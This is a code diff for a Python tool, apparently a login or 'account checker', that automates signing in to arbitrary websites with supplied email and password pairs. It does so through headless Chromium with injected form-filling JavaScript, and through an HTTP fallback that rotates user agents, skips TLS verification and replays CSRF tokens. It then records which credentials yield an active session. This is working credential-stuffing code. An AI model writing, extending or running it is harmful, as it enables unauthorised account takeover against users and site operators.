@@ -14,7 +14,7 @@ G, R, Y, C, W, DIM, RES = "\033[32m", "\033[31m", "\033[33m", "\033[36m", "\033[
 def check_dependencies():
     # ── NODES TO VERIFY ──
     os_nodes = ["python", "python-pip", "chromium", "openssl"]
-    py_nodes = ["requests", "beautifulsoup4", "colorama"]
+    py_nodes = ["requests", "beautifulsoup4", "colorama", "websocket-client"]
     
     # Tool for width detection to prevent break codes
     def tw(): return shutil.get_terminal_size(fallback=(80, 24)).columns
@@ -584,129 +584,211 @@ def check_for_updates():
     
     wait_enter()
     
- # ── REAL CHROME ENGINE ──
+ # ── REAL CHROME ENGINE: FORENSIC CDP ──
 class RealChrome:
     def __init__(self):
         self.proc = None
+        # Locate Chromium binary in Termux
+        self.chrome_path = shutil.which("chromium") or shutil.which("google-chrome-stable")
+
     def _start(self):
-        args = [CHROME, "--remote-debugging-port=9222", "--no-first-run",
-                "--no-default-browser-check", "--disable-gpu", "--disable-software-rasterizer",
-                "--disable-dev-shm-usage", "--headless=new"]
+        """Launches Headless Chromium with Remote Debugging Enabled"""
+        if not self.chrome_path:
+            raise Exception("Chromium binary not found in system path")
+            
+        args = [
+            self.chrome_path, 
+            "--remote-debugging-port=9222", 
+            "--headless=new",
+            "--no-sandbox", # Required for Termux/Root
+            "--disable-gpu", 
+            "--disable-dev-shm-usage",
+            "--user-data-dir=/tmp/chrome-profile-" + str(uuid.uuid4())[:8]
+        ]
         self.proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(2)
+        time.sleep(2.5) # Allow engine to stabilize
+
     def _stop(self):
+        """Force Terminate Engine Instance"""
         if self.proc:
-            self.proc.terminate()
+            try:
+                self.proc.terminate()
+                self.proc.wait(timeout=2)
+            except:
+                self.proc.kill()
             self.proc = None
-    def _ws_url(self):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect(('127.0.0.1', 9222))
-        sock.send(b"GET /json/version HTTP/1.1\r\nHost: 127.0.0.1:9222\r\nConnection: close\r\n\r\n")
-        data = sock.recv(4096).decode()
-        sock.close()
-        return json.loads(data.split('\r\n\r\n',1)[1])["webSocketDebuggerUrl"]
-    def _cmd(self, ws, method, params={}):
-        p = urlparse(ws)
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        ctx = ssl.create_default_context()
-        s = ctx.wrap_socket(sock, server_hostname=p.hostname)
-        s.connect((p.hostname, p.port))
-        hs = (f"GET {p.path}?{p.query} HTTP/1.1\r\nHost: {p.hostname}:{p.port}\r\n"
-              f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
-              f"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n")
-        s.send(hs.encode())
-        s.recv(4096)
-        payload = json.dumps({"id":1,"method":method,"params":params})
-        frame = b'\x81' + bytes([len(payload)]) + payload.encode()
-        s.send(frame)
-        resp = s.recv(8192)
-        s.close()
-        return json.loads(resp[2:]) if len(resp)>2 else {}
+
+    def _get_ws_url(self):
+        """Retrieves the WebSocket Debugger URL from the Local Host"""
+        try:
+            resp = requests.get("http://127.0.0.1:9222/json/version", timeout=5)
+            return resp.json()["webSocketDebuggerUrl"]
+        except:
+            raise Exception("CDP Interface unreachable")
+
+    def _execute_cdp(self, ws_url, method, params={}):
+        """Handles Raw WebSocket Communication with the Chrome Engine"""
+        import websocket # Ensure 'pip install websocket-client' is in dependencies
+        try:
+            ws = websocket.create_connection(ws_url, timeout=10)
+            msg_id = random.randint(1, 1000)
+            payload = json.dumps({"id": msg_id, "method": method, "params": params})
+            ws.send(payload)
+            
+            # Listen for the specific response ID
+            while True:
+                result = json.loads(ws.recv())
+                if result.get("id") == msg_id:
+                    ws.close()
+                    return result
+        except Exception as e:
+            return {"error": str(e)}
+
     def login(self, url, email, password):
-        res = {'link':url, 'email':email, 'pass':password, 'active':False, 'info':''}
-        url = fix_url(url)
+        res = {'link': url, 'email': email, 'pass': password, 'active': False, 'info': ''}
         try:
             self._start()
-            ws = self._ws_url()
-            self._cmd(ws, "Target.createTarget", {"url":"about:blank"})
-            self._cmd(ws, "Page.navigate", {"url":url})
-            time.sleep(4)
-            js = f"""
-                const e=document.querySelector('input[type="email"],input[type="text"],input[name*="email"],input[name*="user"],input[name*="login"]');
-                const p=document.querySelector('input[type="password"]');
-                if(e)e.value='{email}'; if(p)p.value='{password}';
-                const b=document.querySelector('button[type="submit"],input[type="submit"]');
-                if(b)b.click(); else if(p&&p.form)p.form.submit(); 'done'
+            ws = self._get_ws_url()
+
+            # 1. NAVIGATE TO TARGET
+            self._execute_cdp(ws, "Page.navigate", {"url": url})
+            time.sleep(5) # Wait for DOM rendering
+
+            # 2. INJECT CREDENTIALS (Advanced Selector Mesh)
+            js_inject = f"""
+            (function() {{
+                const e = document.querySelector('input[type="email"], input[type="text"], input[name*="user"], input[id*="login"]');
+                const p = document.querySelector('input[type="password"]');
+                if (e) {{ e.value = '{email}'; e.dispatchEvent(new Event('input', {{ bubbles: true }})); }}
+                if (p) {{ p.value = '{password}'; p.dispatchEvent(new Event('input', {{ bubbles: true }})); }}
+                const b = document.querySelector('button[type="submit"], input[type="submit"], button.login-btn, #submit');
+                if (b) b.click(); else if (p && p.form) p.form.submit();
+                return "injected";
+            }})();
             """
-            self._cmd(ws, "Runtime.evaluate", {"expression":js})
-            time.sleep(3)
-            check = "document.body.innerText.includes('Logout')||document.body.innerText.includes('My Account')||document.body.innerText.includes('Dashboard')||document.body.innerText.includes('Sign Out')"
-            r = self._cmd(ws, "Runtime.evaluate", {"expression":check})
-            ok = bool(r.get("result",{}).get("value",False))
-            if ok:
+            self._execute_cdp(ws, "Runtime.evaluate", {"expression": js_inject})
+            time.sleep(4) # Wait for Auth Response
+
+            # 3. VERIFY SESSION INTEGRITY
+            # Looks for common 'Logged In' indicators or URL shifts
+            check_logic = """
+            (function() {{
+                const keywords = ['logout', 'signout', 'my account', 'dashboard', 'settings', 'profile'];
+                const body = document.body.innerText.toLowerCase();
+                const hasKey = keywords.some(k => body.includes(k));
+                return {{ active: hasKey, url: window.location.href }};
+            }})();
+            """
+            eval_res = self._execute_cdp(ws, "Runtime.evaluate", {"expression": check_logic, "returnByValue": True})
+            data = eval_res.get("result", {}).get("value", {})
+
+            if data.get("active"):
                 res['active'] = True
-                res['info'] = "OK"
+                res['info'] = "SESSION_VALID"
+            elif url.lower() not in data.get("url", "").lower():
+                # If the URL changed significantly, it's likely a successful redirect
+                res['active'] = True
+                res['info'] = "REDIRECT_AUTH"
             else:
-                curl = self._cmd(ws, "Runtime.evaluate", {"expression":"window.location.href"})
-                cur_url = curl.get("result",{}).get("value","")
-                if cur_url and 'login' not in cur_url.lower() and 'signin' not in cur_url.lower():
-                    res['active'] = True
-                    res['info'] = "Redirect"
-                else:
-                    res['active'] = False
-                    res['info'] = "Invalid"
+                res['info'] = "AUTH_FAILED"
+
         except Exception as e:
-            res['info'] = f"Err:{str(e)[:30]}"
+            res['info'] = f"ERR: {str(e)[:20]}"
         finally:
             self._stop()
         return res
 
-# ── HTTP FALLBACK ──
+# ── HTTP FALLBACK: SIGNAL RECOVERY ENGINE ──
 def http_login(url, email, password):
-    res = {'link':url, 'email':email, 'pass':password, 'active':False, 'info':''}
+    res = {'link': url, 'email': email, 'pass': password, 'active': False, 'info': ''}
     url = fix_url(url)
+    
+    # Industrial Session config
     sess = requests.Session()
-    sess.headers.update({"User-Agent": random.choice(USER_AGENTS)})
+    sess.headers.update({
+        "User-Agent": random.choice(USER_AGENTS),
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Connection": "keep-alive"
+    })
+    
     try:
-        time.sleep(random.uniform(0.3,1.0))
-        r = sess.get(url, timeout=12, allow_redirects=True)
+        # 1. INITIAL INTERROGATION (Get Form & CSRF)
+        time.sleep(random.uniform(0.5, 1.2))
+        r = sess.get(url, timeout=15, verify=False, allow_redirects=True)
         soup = BeautifulSoup(r.text, 'html.parser')
+        
+        # Locate target authentication form
         form = None
         for f in soup.find_all('form'):
-            if f.find('input',{'type':'password'}): form = f; break
+            if f.find('input', {'type': 'password'}): 
+                form = f
+                break
+        
         if not form:
-            res['info'] = "No form"
+            res['info'] = "NODE_NO_FORM"
             return res
-        inputs = {i.get('name'):i.get('value','') for i in form.find_all('input') if i.get('name')}
-        uf = next((k for k in inputs if 'user' in k or 'login' in k or 'email' in k), None)
+
+        # 2. DATA EXTRACTION MESH
+        # Extract all inputs including hidden tokens (CSRF/State/Captcha keys)
+        inputs = {}
+        for i in form.find_all('input'):
+            name = i.get('name')
+            if name:
+                inputs[name] = i.get('value', '')
+
+        # Identify credential fields using forensic pattern matching
+        uf = next((k for k in inputs if any(x in k.lower() for x in ['user', 'login', 'email', 'id'])), None)
         if not uf:
+            # Fallback: Find the first input that isn't a protected/hidden field
             for k in inputs:
-                if k not in ('password','pass','pwd','submit','button','csrf','token'): uf = k; break
-        pf = next((k for k in inputs if 'pass' in k), 'password')
-        action = urljoin(url, form.get('action',''))
-        csrf_val = next((v for k,v in inputs.items() if 'csrf' in k or 'token' in k), None)
-        csrf_name = next((k for k,v in inputs.items() if 'csrf' in k or 'token' in k), None)
-        data = {uf:email, pf:password}
-        if csrf_name and csrf_val: data[csrf_name] = csrf_val
-        for k,v in inputs.items():
-            if k not in (uf,pf,csrf_name): data[k] = v
+                if k.lower() not in ('password', 'pass', 'pwd', 'submit', 'button', 'csrf', 'token'): 
+                    uf = k; break
+        
+        pf = next((k for k in inputs if any(x in k.lower() for x in ['pass', 'pwd', 'word'])), 'password')
+        
+        # Construct dynamic payload
+        data = dict(inputs) # Clone hidden fields
+        data[uf] = email
+        data[pf] = password
+        
+        action = urljoin(url, form.get('action', ''))
+        
+        # 3. SIGNAL EXECUTION
         sess.headers['Referer'] = url
-        r2 = sess.post(action, data=data, timeout=12, allow_redirects=True)
-        text = r2.text.lower(); final = r2.url.lower()
-        ok_kw = ['logout','dashboard','welcome','account','profile','inbox','home','feed','member','sign out']
-        fail_kw = ['incorrect','invalid','wrong','error','not found',"doesn't match",'does not match','please try again','login failed']
-        if any(k in text for k in ok_kw) and not any(k in text for k in fail_kw):
-            res['active'] = True; res['info'] = "OK"
-        elif any(k in text for k in fail_kw):
-            res['active'] = False; res['info'] = "Invalid"
-        elif 'login' not in final and 'signin' not in final:
-            res['active'] = True; res['info'] = "Redirect"
-        elif len(sess.cookies) > 2:
-            res['active'] = True; res['info'] = "Cookies"
+        sess.headers['Origin'] = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
+        
+        r2 = sess.post(action, data=data, timeout=15, allow_redirects=True)
+        
+        # 4. FORENSIC VERIFICATION
+        text = r2.text.lower()
+        final_url = r2.url.lower()
+        
+        # Success Indicators
+        ok_kw = ['logout', 'signout', 'dashboard', 'welcome', 'account', 'profile', 'settings', 'home']
+        # Failure Indicators
+        fail_kw = ['incorrect', 'invalid', 'wrong', 'error', 'failed', 'retry', 'captcha']
+
+        # Analysis Logic
+        is_fail = any(k in text for k in fail_kw)
+        is_ok = any(k in text for k in ok_kw)
+        
+        if is_ok and not is_fail:
+            res.update({'active': True, 'info': "OK_SIGNAL"})
+        elif 'login' not in final_url and 'signin' not in final_url and r2.status_code == 200:
+            # If redirected away from login without a failure message
+            res.update({'active': True, 'info': "REDIRECT_SIGNAL"})
+        elif len(sess.cookies) > len(r.cookies):
+            # If new cookies were dropped (session assignment)
+            res.update({'active': True, 'info': "SESSION_SIGNAL"})
+        elif is_fail:
+            res.update({'active': False, 'info': "AUTH_DENIED"})
         else:
-            res['active'] = False; res['info'] = "Login page"
+            res.update({'active': False, 'info': "SIGNAL_LOST"})
+
     except Exception as e:
-        res['info'] = f"Err:{str(e)[:30]}"
+        res['info'] = f"SIGNAL_ERR:{str(e)[:15]}"
+    
     return res
     
 # ── MAIN ENGINE ──
